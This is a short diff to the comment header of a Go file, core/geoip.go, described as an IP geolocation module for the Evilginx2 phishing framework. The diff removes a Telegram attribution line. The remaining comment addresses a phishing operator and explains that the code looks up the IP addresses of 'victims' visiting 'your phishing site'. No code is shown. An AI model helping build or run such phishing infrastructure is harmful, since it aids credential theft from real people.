@@ -1,7 +1,6 @@
 // core/geoip.go
 // IP Geolocation Engine for Evilginx2
 //
-// Telegram Edition by @officialmonsterz (https://t.me/officialmonsterz)
 //
 // WHAT THIS DOES (baby steps):
 //   When a victim visits your phishing site, this looks up their IP address
